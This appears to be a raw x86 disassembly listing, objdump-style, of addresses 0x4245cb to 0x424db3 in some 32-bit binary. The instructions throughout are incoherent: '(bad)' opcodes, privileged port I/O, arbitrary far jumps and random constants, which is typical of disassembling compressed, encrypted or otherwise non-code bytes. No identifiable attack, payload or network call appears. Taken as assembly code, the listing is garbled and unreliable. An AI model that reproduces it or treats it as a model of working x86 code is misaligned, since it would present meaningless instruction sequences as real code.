  4245cb:	not    BYTE PTR [ebx]
  4245cd:	loopne 0x424575
  4245cf:	dec    ebx
  4245d0:	lock in eax,0x18
  4245d3:	leave  
  4245d4:	xchg   esi,eax
  4245d5:	sbb    al,0x36
  4245d7:	mov    esi,0xfeb4ec23
  4245dc:	in     al,0xb7
  4245de:	mov    al,ds:0x4aa65469
  4245e3:	js     0x424659
  4245e5:	and    al,0x29
  4245e7:	sub    BYTE PTR [eax+0x6d19beb],0xff
  4245ee:	jmp    0x4245d4
  4245f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245f1:	pushf  
  4245f2:	pop    esi
  4245f3:	cmp    BYTE PTR [esi+0x4972e25e],dh
  4245f9:	pop    ss
  4245fa:	dec    eax
  4245fb:	lock repnz scas al,BYTE PTR es:[edi]
  4245fe:	sub    DWORD PTR [eax],ebp
  424600:	(bad)  [eax+0x2b]
  424603:	sbb    eax,0xed614991
  424608:	ror    BYTE PTR ds:0x4bfc2f25,cl
  42460e:	mov    esp,0x2c40f7af
  424613:	pop    ebp
  424614:	jmp    0x424653
  424616:	mov    ds:0x27692185,eax
  42461b:	jne    0x424663
  42461d:	js     0x424688
  42461f:	mov    esp,0xba0de1bd
  424624:	shr    DWORD PTR [edx-0x5f31a001],1
  42462a:	dec    esp
  42462b:	or     al,0x55
  42462d:	cld    
  42462e:	js     0x4245de
  424630:	loope  0x424668
  424632:	mov    gs:0xea33d6b8,al
  424638:	das    
  424639:	shl    BYTE PTR [esi-0x15e5231f],0x50
  424640:	int3   
  424641:	aaa    
  424642:	loop   0x4245fe
  424644:	(bad)  
  424645:	out    0x58,al
  424647:	outs   dx,DWORD PTR ds:[esi]
  424648:	sub    DWORD PTR [eax+ebp*1],ecx
  42464b:	icebp  
  42464c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42464d:	jl     0x4246bc
  42464f:	sbb    BYTE PTR [edx],0xdf
  424652:	jns    0x4245f4
  424654:	xchg   esp,eax
  424655:	adc    bh,ah
  424657:	retf   
  424658:	in     eax,dx
  424659:	mov    BYTE PTR [ecx],cl
  42465b:	in     al,dx
  42465c:	cmp    cl,BYTE PTR [edi]
  42465e:	inc    ebx
  42465f:	mul    esi
  424661:	dec    edx
  424662:	adc    DWORD PTR [ecx*1-0x1393235b],0x16
  42466a:	pusha  
  42466b:	and    al,0xd2
  42466d:	leave  
  42466e:	push   ecx
  42466f:	jecxz  0x42466b
  424671:	rcl    eax,cl
  424673:	cdq    
  424674:	mov    dh,0x83
  424676:	push   ebx
  424677:	add    ah,BYTE PTR [edi-0x41281f3d]
  42467d:	shr    DWORD PTR [eax+0xbce0b95],cl
  424683:	inc    edx
  424684:	adc    dl,BYTE PTR [edx]
  424686:	mov    bl,0xf3
  424688:	and    dh,BYTE PTR [eax+0x112c1f65]
  42468e:	adc    DWORD PTR [eax+0xfe7e98d],ecx
  424694:	sbb    BYTE PTR [esi-0x1a1869dd],0x4a
  42469b:	aas    
  42469c:	(bad)  
  42469d:	xlat   BYTE PTR ds:[ebx]
  42469e:	rcl    DWORD PTR [edi-0x5f],cl
  4246a1:	xor    ch,BYTE PTR [ebp-0x48]
  4246a4:	dec    edx
  4246a5:	push   ecx
  4246a6:	mov    ebx,0xd07c59d1
  4246ab:	cli    
  4246ac:	rcr    BYTE PTR [ebx],cl
  4246ae:	(bad)  
  4246af:	add    ch,BYTE PTR [ebx]
  4246b1:	mov    gs,WORD PTR [esi-0x5f236a39]
  4246b7:	fcomp  st(5)
  4246b9:	mov    ch,0x64
  4246bb:	xor    bl,BYTE PTR [edi]
  4246bd:	pop    edi
  4246be:	and    BYTE PTR [eax],dh
  4246c0:	cmp    dl,BYTE PTR [ebx-0x4]
  4246c3:	test   eax,0xc95bf26
  4246c8:	stos   DWORD PTR es:[edi],eax
  4246c9:	cmp    bh,ch
  4246cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246cc:	sub    eax,0x176545f5
  4246d1:	sbb    BYTE PTR [ebp-0x6ce7a7fb],dh
  4246d7:	cmp    al,0x8f
  4246d9:	sahf   
  4246da:	push   ecx
  4246db:	xor    ch,BYTE PTR [ebx+0x2f6d79d6]
  4246e1:	(bad)  
  4246e2:	aam    0x49
  4246e4:	loope  0x424722
  4246e6:	int3   
  4246e7:	loope  0x42475e
  4246e9:	mov    ds:0xb74df13,eax
  4246ee:	test   eax,0x17f814a4
  4246f3:	cmp    ch,cl
  4246f5:	sbb    BYTE PTR [esi],bl
  4246f7:	test   BYTE PTR ss:[eax],0x60
  4246fb:	cwde   
  4246fc:	dec    edx
  4246fd:	xor    BYTE PTR [ebx-0x7cb353e6],dl
  424703:	jae    0x424774
  424705:	mov    eax,ds:0xc478be31
  42470a:	les    esp,FWORD PTR [esi+0x714a66de]
  424710:	fnsave [esi]
  424712:	xchg   ebp,eax
  424713:	call   0xd30b:0x3fc76d80
  42471a:	xchg   ebp,eax
  42471b:	ins    BYTE PTR es:[edi],dx
  42471c:	out    dx,al
  42471d:	jge    0x4246a7
  42471f:	sub    al,0x7a
  424721:	pop    ebx
  424722:	xchg   ecx,eax
  424723:	pop    ss
  424724:	xchg   esi,eax
  424725:	inc    esi
  424726:	mov    ecx,edx
  424728:	xchg   edi,eax
  424729:	pop    ebp
  42472a:	xor    BYTE PTR [ebx],0x27
  42472d:	push   cs
  42472e:	sbb    ah,BYTE PTR ds:0x1250ff45
  424734:	int3   
  424735:	mov    ecx,0x5a64d382
  42473a:	push   0xffffffe9
  42473c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42473d:	(bad)  
  42473e:	retf   
  42473f:	lods   al,BYTE PTR ds:[esi]
  424740:	popa   
  424741:	dec    edx
  424742:	jecxz  0x4246fb
  424744:	jl     0x42470b
  424746:	stc    
  424747:	or     dh,BYTE PTR [ebx+0x30ddb9cb]
  42474d:	out    dx,eax
  42474e:	nop
  42474f:	inc    esp
  424750:	xor    al,0x68
  424752:	xlat   BYTE PTR ds:[ebx]
  424753:	enter  0x9018,0x6d
  424757:	xor    ah,bh
  424759:	adc    DWORD PTR [edi+0x47],0x52
  42475d:	int3   
  42475e:	jp     0x42470b
  424760:	stos   DWORD PTR es:[edi],eax
  424761:	mov    edx,0x34464cd0
  424766:	or     dl,dl
  424768:	adc    eax,0x384bc8ad
  42476d:	pusha  
  42476e:	in     eax,dx
  42476f:	bound  esp,QWORD PTR [eax-0x7c6e0e01]
  424775:	mov    BYTE PTR [eax-0x10],ah
  424778:	inc    esp
  424779:	xor    ebp,esp
  42477b:	jecxz  0x424734
  42477d:	sbb    BYTE PTR [esi+0x163e5490],0xec
  424784:	mov    ecx,0x90138ec1
  424789:	sub    BYTE PTR [edx-0x67],cl
  42478c:	add    al,bl
  42478e:	dec    esp
  42478f:	mov    bl,0xf6
  424791:	popf   
  424792:	retf   
  424793:	adc    ah,BYTE PTR [edx]
  424795:	rcr    edi,1
  424797:	ds int 0xab
  42479a:	rcl    DWORD PTR ss:[ebp-0x5b582bf9],cl
  4247a1:	mov    bh,0x3f
  4247a3:	fs scas al,BYTE PTR es:[edi]
  4247a5:	mov    fs:0x7683cab7,al
  4247ab:	bound  edi,QWORD PTR [ebp+0x4b]
  4247ae:	nop
  4247af:	pop    esp
  4247b0:	cmp    eax,0xad910046
  4247b5:	test   al,0x91
  4247b7:	xor    ah,BYTE PTR [ebp-0x61850186]
  4247bd:	sub    ebx,DWORD PTR [ebx+0x2654c72]
  4247c3:	stc    
  4247c4:	cmp    esi,DWORD PTR [esi]
  4247c6:	push   ecx
  4247c7:	cdq    
  4247c8:	push   ebx
  4247c9:	into   
  4247ca:	cmp    DWORD PTR [ecx+0x55],edx
  4247cd:	data16 jae 0x424771
  4247d0:	add    DWORD PTR [ebx+0x13022cb8],ebp
  4247d6:	pop    ebp
  4247d7:	lea    edx,[eax]
  4247d9:	(bad)  
  4247da:	pop    edx
  4247db:	loop   0x424806
  4247dd:	stc    
  4247de:	xor    eax,0x8a121678
  4247e3:	mov    al,ds:0xc763cf03
  4247e8:	mov    esi,0x270c6a0f
  4247ed:	repz ja 0x4247b1
  4247f0:	es jns 0x4247b1
  4247f3:	jmp    0x5ce5:0x4300a17f
  4247fa:	xchg   esi,eax
  4247fb:	cld    
  4247fc:	inc    ecx
  4247fd:	retf   
  4247fe:	add    dh,ch
  424800:	cli    
  424801:	or     eax,0x8fee80c5
  424806:	idiv   BYTE PTR [edx+0x196fd2b9]
  42480c:	adc    bh,dl
  42480e:	mov    DWORD PTR [ecx-0xd],eax
  424811:	fidiv  WORD PTR [eax+ebx*4+0x4fd83d9f]
  424818:	and    bh,BYTE PTR [esi+0x5c]
  42481b:	dec    edx
  42481c:	inc    ebp
  42481d:	imul   ecx,ecx,0xffffffdf
  424820:	xor    al,0x6b
  424822:	sahf   
  424823:	mov    ch,0x60
  424825:	pop    esp
  424826:	sbb    sp,WORD PTR [esi+ebp*1-0x2b93c944]
  42482e:	aad    0xd8
  424830:	mov    eax,0xdd7d592e
  424835:	dec    ebx
  424836:	jg     0x42487e
  424838:	xchg   ebx,eax
  424839:	retf   
  42483a:	(bad)  
  42483b:	mul    DWORD PTR [esi+ebp*1+0x5d179d22]
  424842:	xor    eax,0x48e99f4
  424847:	cmp    DWORD PTR [ebx-0x9dc1482],ebp
  42484d:	fwait
  42484e:	sahf   
  42484f:	fmul   DWORD PTR [ecx-0x58]
  424852:	pop    ecx
  424853:	or     edi,DWORD PTR [esp+ebp*2]
  424856:	ins    BYTE PTR es:[edi],dx
  424857:	cs pop es
  424859:	add    esp,DWORD PTR [eax+0x7df65c39]
  42485f:	jmp    0xc52ef8c3
  424864:	xor    eax,0xf1ca6bae
  424869:	fsubp  st(5),st
  42486b:	dec    ecx
  42486c:	pop    ss
  42486d:	aas    
  42486e:	mov    ah,0x69
  424870:	pop    ss
  424871:	out    dx,eax
  424872:	and    al,cl
  424874:	pop    es
  424875:	stos   DWORD PTR es:[edi],eax
  424876:	loope  0x42488a
  424878:	adc    eax,0xea96844c
  42487d:	xchg   esp,eax
  42487e:	fwait
  42487f:	xor    edi,DWORD PTR [ebp+0x6d]
  424882:	test   DWORD PTR [edx],esp
  424884:	inc    edx
  424885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424886:	jecxz  0x4248e7
  424888:	inc    edx
  424889:	scas   eax,DWORD PTR es:[edi]
  42488a:	sub    eax,0x282f0ae1
  42488f:	or     eax,0xe5a7f3a0
  424894:	aaa    
  424895:	clc    
  424896:	mov    eax,ds:0x6488b6cd
  42489b:	pop    ds
  42489c:	je     0x4248f1
  42489e:	add    ch,ch
  4248a0:	icebp  
  4248a1:	jecxz  0x4248d4
  4248a3:	out    0x2a,eax
  4248a5:	fisub  DWORD PTR fs:[ebx-0xe5c230e]
  4248ac:	clc    
  4248ad:	test   BYTE PTR [ebx+0x26],al
  4248b0:	add    ebx,DWORD PTR [ebp+0x27]
  4248b3:	cs je  0x424904
  4248b6:	aas    
  4248b7:	rcl    eax,1
  4248b9:	test   ecx,esi
  4248bb:	pop    esp
  4248bc:	xchg   ebp,eax
  4248bd:	or     esp,eax
  4248bf:	mov    cl,0x37
  4248c1:	cmc    
  4248c2:	stos   DWORD PTR es:[edi],eax
  4248c3:	ds xor bl,ch
  4248c6:	inc    edi
  4248c7:	lods   eax,DWORD PTR ds:[esi]
  4248c8:	xor    DWORD PTR [ebx],esi
  4248ca:	jnp    0x424932
  4248cc:	adc    BYTE PTR [ecx+0x12],al
  4248cf:	sbb    esi,ecx
  4248d1:	sbb    DWORD PTR [edx-0x3ef5aa11],ebp
  4248d7:	shl    DWORD PTR ds:0xdf4a30dd,1
  4248dd:	enter  0xd81f,0x35
  4248e1:	inc    ecx
  4248e2:	fidivr DWORD PTR [ebx+0x18]
  4248e5:	(bad)  
  4248e7:	mov    ebx,0x4266315
  4248ec:	fisub  DWORD PTR [edx]
  4248ee:	popa   
  4248ef:	pop    esi
  4248f0:	cmp    DWORD PTR [edx],ecx
  4248f2:	dec    eax
  4248f3:	xor    BYTE PTR [ecx-0x799037b9],0xd0
  4248fa:	fwait
  4248fb:	or     dh,cl
  4248fd:	fnstenv [esi-0x5cc5979d]
  424903:	mov    ds:0x3213035e,al
  424908:	ror    DWORD PTR ds:0x69e00f9,0x2
  42490f:	or     ebp,edx
  424911:	(bad)  
  424912:	sbb    eax,0x2e52ea3
  424917:	mov    es,WORD PTR [ebx-0x28bc4fc3]
  42491d:	lods   al,BYTE PTR ds:[esi]
  42491e:	xor    esi,DWORD PTR [esi+0x3d6a3ea7]
  424924:	push   0xfffffffc
  424926:	retf   
  424927:	sahf   
  424928:	lea    edx,[esi-0x7abf7153]
  42492e:	cli    
  42492f:	push   ss
  424930:	mov    dh,BYTE PTR [edx]
  424932:	packuswb mm5,QWORD PTR [edi-0x50]
  424936:	add    eax,0x120b3d23
  42493b:	pop    ebp
  42493c:	enter  0x5d10,0x1
  424940:	pushf  
  424941:	push   esi
  424942:	xchg   esi,eax
  424943:	sahf   
  424944:	cdq    
  424945:	rcr    BYTE PTR [eax],1
  424947:	(bad)  
  424948:	cmp    ch,BYTE PTR [edx-0x75]
  42494b:	dec    ebx
  42494c:	call   DWORD PTR [edi-0x4e]
  42494f:	imul   edi,DWORD PTR cs:[ecx+0x5c],0x35cb0297
  424957:	(bad)  [ebx+edi*8]
  42495a:	push   ecx
  42495b:	mov    cl,0x37
  42495d:	fldcw  WORD PTR [ebx]
  42495f:	or     ebx,ecx
  424961:	push   es
  424962:	cmp    al,0x37
  424964:	fwait
  424965:	dec    esp
  424966:	cwde   
  424967:	sbb    ebx,DWORD PTR [eax+0x2b]
  42496a:	push   ss
  42496b:	sar    BYTE PTR [edi],1
  42496d:	loop   0x424992
  42496f:	gs addr16 popa 
  424972:	std    
  424973:	pop    esp
  424974:	mov    esi,0x86830a8c
  424979:	fucomi st,st(5)
  42497b:	stc    
  42497c:	inc    esi
  42497d:	lea    ebp,[eax]
  42497f:	sub    eax,0xf035fcf7
  424984:	pushf  
  424985:	stc    
  424986:	dec    al
  424988:	(bad)  
  424989:	pop    edi
  42498a:	enter  0xb6fc,0xc3
  42498e:	cld    
  42498f:	pop    eax
  424990:	lds    ebx,FWORD PTR [esi+esi*1]
  424993:	pop    edx
  424994:	cmc    
  424995:	popa   
  424996:	popa   
  424997:	push   eax
  424998:	(bad)  
  424999:	jbe    0x424948
  42499b:	adc    BYTE PTR [edx+0x5fe3d7f],al
  4249a1:	and    ecx,0xffffffd5
  4249a4:	adc    DWORD PTR [esi-0x35bf524a],0x5
  4249ab:	imul   ebx,DWORD PTR [ecx+ebp*2],0x4d
  4249af:	ja     0x424a24
  4249b1:	inc    esi
  4249b2:	ins    BYTE PTR es:[edi],dx
  4249b3:	imul   esi,DWORD PTR [esp+eiz*2+0x2a],0x68fbba68
  4249bb:	(bad)  
  4249bc:	cmp    esp,DWORD PTR [edi+0x75]
  4249bf:	pop    esi
  4249c0:	fisubr WORD PTR [edi+0x9758ef]
  4249c6:	call   0x2bb:0x477409b
  4249cd:	dec    sp
  4249cf:	push   edx
  4249d0:	hlt    
  4249d1:	and    al,0xa1
  4249d3:	xor    DWORD PTR [ebx+0x1472fbb7],esp
  4249d9:	pop    edi
  4249da:	jno    0x424976
  4249dc:	sbb    al,BYTE PTR [ebx+0x7336cc2a]
  4249e2:	aad    0x6d
  4249e4:	push   esp
  4249e5:	and    ebp,DWORD PTR [ebx+0x2f4bee46]
  4249eb:	jns    0x424a4d
  4249ed:	je     0x42497b
  4249ef:	leave  
  4249f0:	scas   eax,DWORD PTR es:[edi]
  4249f1:	push   edi
  4249f2:	dec    ecx
  4249f3:	inc    ebp
  4249f4:	dec    esi
  4249f5:	pop    ebx
  4249f6:	mov    eax,ds:0x83f82a82
  4249fb:	(bad)  
  4249fc:	out    0x88,al
  4249fe:	les    edx,FWORD PTR [edi-0x3f]
  424a01:	push   es
  424a02:	int3   
  424a03:	mov    DWORD PTR [edi+0x7a],esp
  424a06:	mov    ch,ah
  424a08:	push   ecx
  424a09:	adc    edi,esp
  424a0b:	into   
  424a0c:	fisttp WORD PTR [edi-0x46e9a68]
  424a12:	in     eax,dx
  424a13:	sub    al,0x6d
  424a15:	sahf   
  424a16:	mov    BYTE PTR [esi+0x16],bl
  424a19:	std    
  424a1a:	mov    ah,0xf6
  424a1c:	sahf   
  424a1d:	jmp    0x8320:0xfb75419e
  424a24:	mov    eax,ds:0x3f0e7216
  424a29:	xchg   edx,eax
  424a2a:	adc    al,0x72
  424a2c:	or     BYTE PTR [esi+0x16],cl
  424a2f:	pop    eax
  424a30:	out    dx,al
  424a31:	jae    0x424aa2
  424a33:	pop    esi
  424a34:	pushf  
  424a35:	(bad)  
  424a36:	push   ebx
  424a37:	(bad)  
  424a38:	adc    BYTE PTR [ebx-0x32],dh
  424a3b:	or     dl,BYTE PTR [ebx-0x25]
  424a3e:	arpl   di,sp
  424a40:	mov    ds:0x8d2109d4,al
  424a45:	ss mov esp,0xf485cd8e
  424a4b:	(bad)  
  424a4c:	fnstsw WORD PTR [edi+0x662bd5d7]
  424a52:	test   eax,0xb4c5ba3
  424a57:	gs cld 
  424a59:	mov    edi,0xb55d64bd
  424a5e:	das    
	...
  424a67:	add    BYTE PTR [eax],al
  424a69:	add    BYTE PTR [edx+0x41],dl
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	daa    
  424a77:	mov    bh,BYTE PTR [edx+0x4c]
  424a7a:	fadd   DWORD PTR es:[ecx]
  424a7d:	add    BYTE PTR [ebp+0x6],bh
  424a80:	add    BYTE PTR [eax],al
  424a82:	xchg   ebp,eax
  424a83:	mov    cl,0x72
  424a85:	xor    eax,0xc65b2851
  424a8a:	pop    ecx
  424a8b:	pushf  
  424a8c:	popf   
  424a8d:	push   eax
  424a8e:	test   BYTE PTR [esi+0x36],bl
  424a91:	sbb    al,0xad
  424a93:	scas   al,BYTE PTR es:[edi]
  424a94:	xchg   DWORD PTR [edi-0x5b],edi
  424a97:	inc    esi
  424a98:	mov    bl,0x8a
  424a9a:	jmp    0x8dd0:0x769b4cb
  424aa1:	jne    0x424acb
  424aa3:	fdiv   DWORD PTR [esi+0x21b28ac1]
  424aa9:	shr    DWORD PTR [edi-0x35],1
  424aac:	jno    0x424a58
  424aae:	push   cs
  424aaf:	xchg   esi,eax
  424ab0:	ss mov dh,0x18
  424ab3:	jb     0x424b21
  424ab5:	push   edx
  424ab6:	or     al,BYTE PTR [edi+0x5e25a81d]
  424abc:	ins    BYTE PTR es:[edi],dx
  424abd:	mov    fs,WORD PTR [ebp-0x15]
  424ac0:	mov    cs,WORD PTR [edi]
  424ac2:	dec    esp
  424ac3:	mov    al,0x6c
  424ac5:	fldenv [eax+0x4c]
  424ac8:	retf   0x892b
  424acb:	(bad)  
  424acc:	xchg   esp,eax
  424acd:	jmp    0x2ff6:0x8b0514b9
  424ad4:	inc    DWORD PTR [ecx+0x785bf1e7]
  424ada:	mov    esp,0x56cbef6f
  424adf:	aaa    
  424ae0:	dec    eax
  424ae1:	mov    ecx,0x3f0cf1f7
  424ae6:	jns    0x424ac9
  424ae8:	and    BYTE PTR [edx+0x58a6e248],dl
  424aee:	inc    ebx
  424aef:	jb     0x424b2e
  424af1:	dec    eax
  424af2:	push   edx
  424af3:	cmp    esp,edi
  424af5:	xor    al,0x7a
  424af7:	push   es
  424af8:	add    esp,DWORD PTR [edi]
  424afa:	pop    edx
  424afb:	sub    ah,BYTE PTR [edi-0x53]
  424afe:	and    dh,BYTE PTR [edx-0x5b87362d]
  424b04:	fmul   DWORD PTR [esi+0x6b]
  424b07:	(bad)  
  424b08:	mov    ecx,0x498aedf0
  424b0d:	test   BYTE PTR [ebx+0x567f2dd5],bh
  424b13:	aas    
  424b14:	mov    eax,0x87051be5
  424b19:	sub    al,0x18
  424b1b:	mov    ebp,edx
  424b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b1e:	jg     0x424b1c
  424b20:	add    DWORD PTR [eax+0x6d],ebp
  424b23:	popa   
  424b24:	dec    DWORD PTR [edx]
  424b26:	test   eax,0xbd795d98
  424b2b:	call   0xf7cca68d
  424b30:	mov    edx,0x1ecddd37
  424b35:	push   ds
  424b36:	jns    0x424b24
  424b38:	lods   eax,DWORD PTR ds:[esi]
  424b39:	ja     0x424ad3
  424b3b:	adc    dl,bl
  424b3d:	enter  0x35fb,0x29
  424b41:	and    bl,BYTE PTR [ecx+0x169b978d]
  424b47:	repz cwde 
  424b49:	add    eax,0x434a183f
  424b4e:	aaa    
  424b4f:	cmp    esp,DWORD PTR [ebp+eiz*2-0x30b46da]
  424b56:	in     eax,dx
  424b57:	cs ss pusha 
  424b5a:	inc    eax
  424b5b:	iret   
  424b5c:	sbb    al,0x54
  424b5e:	xchg   ebp,eax
  424b5f:	les    ebp,FWORD PTR [ecx-0x21]
  424b62:	mov    eax,ds:0xad129599
  424b67:	shl    BYTE PTR [edi],1
  424b69:	push   edx
  424b6a:	mov    al,ds:0x17dd6df
  424b6f:	jmp    0x198c:0xf6487620
  424b76:	cmc    
  424b77:	fadd   DWORD PTR ds:0x2ee253f0
  424b7d:	lods   al,BYTE PTR ds:[esi]
  424b7e:	sub    eax,0x5680ffb9
  424b83:	inc    esi
  424b84:	mov    dl,BYTE PTR [ecx+0x1080f274]
  424b8a:	rcl    DWORD PTR [ecx-0x70],cl
  424b8d:	adc    eax,0x2f96fe34
  424b92:	or     al,0x33
  424b94:	pop    ebp
  424b95:	outs   dx,BYTE PTR ds:[esi]
  424b96:	cmp    BYTE PTR [ebp-0x11ff42cd],dl
  424b9c:	jg     0x424bec
  424b9e:	inc    ebp
  424b9f:	outs   dx,BYTE PTR ds:[esi]
  424ba0:	(bad)  
  424ba1:	push   esi
  424ba2:	or     eax,esi
  424ba4:	lods   al,BYTE PTR ds:[esi]
  424ba5:	xchg   ecx,eax
  424ba6:	mov    ebp,0xabfebf2a
  424bab:	mov    ah,BYTE PTR [ebx+0x3eb6ea06]
  424bb1:	jno    0x424b6a
  424bb3:	imul   ecx,DWORD PTR [eax+0x3f],0x26fb1db0
  424bba:	mov    bh,0x1c
  424bbc:	out    0xfa,al
  424bbe:	shl    BYTE PTR [ebx],cl
  424bc0:	ror    BYTE PTR [esi-0x26],0x33
  424bc4:	jmp    0xf5c7:0xfccd1948
  424bcb:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bcd:	fwait
  424bce:	(bad)  
  424bd0:	mov    cl,0x61
  424bd2:	in     al,dx
  424bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bd4:	call   0x9f8b:0xed8519a7
  424bdb:	ja     0x424b8a
  424bdd:	inc    eax
  424bde:	int    0x63
  424be0:	sub    al,0xf2
  424be2:	int    0x93
  424be4:	stc    
  424be5:	pushf  
  424be6:	pop    ds
  424be7:	lea    edi,[ecx+0x7696ebb2]
  424bed:	imul   edx,DWORD PTR [esi],0xffffffde
  424bf0:	dec    ebx
  424bf1:	or     DWORD PTR [edx],edi
  424bf3:	mov    bh,0xa6
  424bf5:	mov    ah,0x9b
  424bf7:	test   eax,0xbeafd898
  424bfc:	icebp  
  424bfd:	aaa    
  424bfe:	sahf   
  424bff:	lock jg 0x424bbc
  424c02:	(bad)  
  424c03:	popa   
  424c04:	inc    ebp
  424c05:	shrd   DWORD PTR [ebx+0x2bf6db25],ebp,cl
  424c0c:	sar    DWORD PTR [ecx],0xdf
  424c0f:	and    BYTE PTR [eiz*1-0x57a06572],al
  424c16:	mov    al,ds:0xec673a98
  424c1b:	pop    esp
  424c1c:	repz call 0x5649440d
  424c22:	push   edi
  424c23:	push   edx
  424c24:	jp     0x424c6e
  424c26:	in     al,dx
  424c27:	(bad)  
  424c28:	and    ecx,eax
  424c2a:	cmp    eax,0x13515933
  424c2f:	adc    BYTE PTR [ebp+0x47],ah
  424c32:	mov    cl,0xc8
  424c34:	cli    
  424c35:	mov    dh,0x20
  424c37:	mov    ds:0x58005983,al
  424c3c:	(bad)  
  424c3d:	out    dx,eax
  424c3e:	mov    eax,ds:0x59c0b483
  424c43:	imul   dx,WORD PTR [ebx+ebx*8],0x6265
  424c49:	dec    esi
  424c4a:	xor    dh,BYTE PTR [ebx]
  424c4c:	in     eax,0x79
  424c4e:	mov    ch,0xf0
  424c50:	inc    ecx
  424c51:	dec    esp
  424c52:	adc    al,0xfb
  424c54:	sub    BYTE PTR [edx+0x12],bl
  424c57:	push   edx
  424c58:	add    bl,bh
  424c5a:	punpckhbw mm2,QWORD PTR [ecx]
  424c5d:	push   eax
  424c5e:	jle    0x424c6c
  424c60:	dec    eax
  424c61:	pop    ecx
  424c62:	cmp    esp,DWORD PTR [edx+0x550f80da]
  424c68:	lock repz out 0x50,al
  424c6c:	mov    ds:0xe6bf6091,al
  424c71:	mov    ebx,DWORD PTR [edx-0x38]
  424c74:	cmpxchg BYTE PTR [edi+0x7fc70c60],cl
  424c7b:	adc    BYTE PTR [esi],dh
  424c7d:	dec    ecx
  424c7e:	nop    DWORD PTR ds:0x8367ff84
  424c85:	inc    ecx
  424c86:	je     0x424cba
  424c88:	fild   WORD PTR [esi]
  424c8a:	loope  0x424c64
  424c8c:	bound  esp,QWORD PTR [edi+0xf9f0367]
  424c92:	or     BYTE PTR [ebp-0x4d47981],al
  424c98:	loope  0x424cde
  424c9a:	push   edx
  424c9b:	test   eax,0x3fa43a69
  424ca0:	jnp    0x424cd9
  424ca2:	jmp    FWORD PTR [ebp+0xf]
  424ca5:	pop    edi
  424ca6:	enter  0x2a4c,0xb4
  424caa:	fld    QWORD PTR [esp+eiz*8]
  424cad:	or     eax,0x4117a873
  424cb2:	xchg   esi,eax
  424cb3:	mov    bl,0xca
  424cb5:	jne    0x424cc1
  424cb7:	push   esi
  424cb8:	retf   0xfece
  424cbb:	mov    esi,0x50d72591
  424cc0:	in     eax,0x2f
  424cc2:	aam    0x12
  424cc4:	sub    eax,0x43d41426
  424cc9:	sbb    edx,edi
  424ccb:	pop    ecx
  424ccc:	fs jb  0x424cc0
  424ccf:	mov    bl,0xf5
  424cd1:	inc    esi
  424cd2:	sub    al,BYTE PTR [edx-0xb]
  424cd5:	(bad)  
  424cd6:	push   esp
  424cd7:	stc    
  424cd8:	mov    dh,0x25
  424cda:	test   eax,0x9ded0a4d
  424cdf:	hlt    
  424ce0:	jae    0x424c70
  424ce2:	in     eax,dx
  424ce3:	jle    0x424c77
  424ce5:	popf   
  424ce6:	mov    ds:0x13ee1d21,al
  424ceb:	sub    eax,0xd721c167
  424cf0:	(bad)  
  424cf1:	push   esp
  424cf2:	pop    es
  424cf3:	fist   WORD PTR [ecx-0x55b9d46c]
  424cf9:	push   esi
  424cfa:	aad    0xed
  424cfc:	popf   
  424cfd:	aam    0xe8
  424cff:	dec    ebx
  424d00:	and    eax,0x8d2a3d9f
  424d05:	and    al,cl
  424d07:	cmp    al,0xb
  424d09:	out    0x94,eax
  424d0b:	repnz addr16 xchg esp,eax
  424d0e:	and    edi,0x58
  424d11:	push   esp
  424d12:	adc    cl,ah
  424d14:	ja     0x424d57
  424d16:	fidivr DWORD PTR [ecx]
  424d18:	in     al,dx
  424d19:	jle    0x424cdf
  424d1b:	xchg   ebp,eax
  424d1c:	pop    edx
  424d1d:	test   BYTE PTR [edi],al
  424d1f:	sbb    BYTE PTR [edx+0x49],ch
  424d22:	mov    BYTE PTR fs:[esi],dh
  424d25:	push   ss
  424d26:	data16 mov al,ds:0x8030593e
  424d2c:	mov    bh,0xa7
  424d2e:	cmp    BYTE PTR [ebp-0x3291f9bb],cl
  424d34:	jecxz  0x424d47
  424d36:	sbb    al,0x9c
  424d38:	iret   
  424d39:	or     al,0xaa
  424d3b:	adc    DWORD PTR [edx+eiz*2],0xffffffe3
  424d3f:	sbb    bh,BYTE PTR [ecx-0x297d1e1c]
  424d45:	rol    BYTE PTR [eax],1
  424d47:	inc    ecx
  424d48:	adc    ch,dh
  424d4a:	int    0x39
  424d4c:	repnz rcl DWORD PTR [eax-0x2cd86b13],0x3a
  424d54:	jbe    0x424d89
  424d56:	test   esi,edi
  424d58:	cs sti 
  424d5a:	les    ebx,FWORD PTR [edx]
  424d5c:	ja     0x424cf2
  424d5e:	aam    0xf8
  424d60:	jp     0x424d31
  424d62:	dec    edx
  424d63:	mov    al,ds:0xcd9c65de
  424d68:	adc    ah,ch
  424d6a:	out    dx,eax
  424d6b:	pop    eax
  424d6c:	je     0x424d71
  424d6e:	stos   DWORD PTR es:[edi],eax
  424d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d70:	or     bh,BYTE PTR [ebx+0x59799151]
  424d76:	arpl   WORD PTR [ebx+0x6ad54ca0],di
  424d7c:	jmp    0x424db2
  424d7e:	mov    ebp,0x321a06a1
  424d83:	pop    ss
  424d84:	push   esi
  424d85:	mov    eax,ds:0xf34c76f6
  424d8a:	pop    ds
  424d8b:	xor    al,0xa3
  424d8d:	clc    
  424d8e:	xchg   edi,eax
  424d8f:	mov    ebp,0x8542f42
  424d94:	mov    dh,0x5c
  424d96:	mov    eax,0x598f7224
  424d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d9c:	or     eax,0x5f872877
  424da1:	lock clc 
  424da3:	shl    DWORD PTR [esi],cl
  424da5:	dec    eax
  424da6:	stc    
  424da7:	ret    
  424da8:	ds cmp al,0x1e
  424dab:	pusha  
  424dac:	sub    DWORD PTR [eax+0x658830d6],0xffffffbc
  424db3:	lahf   
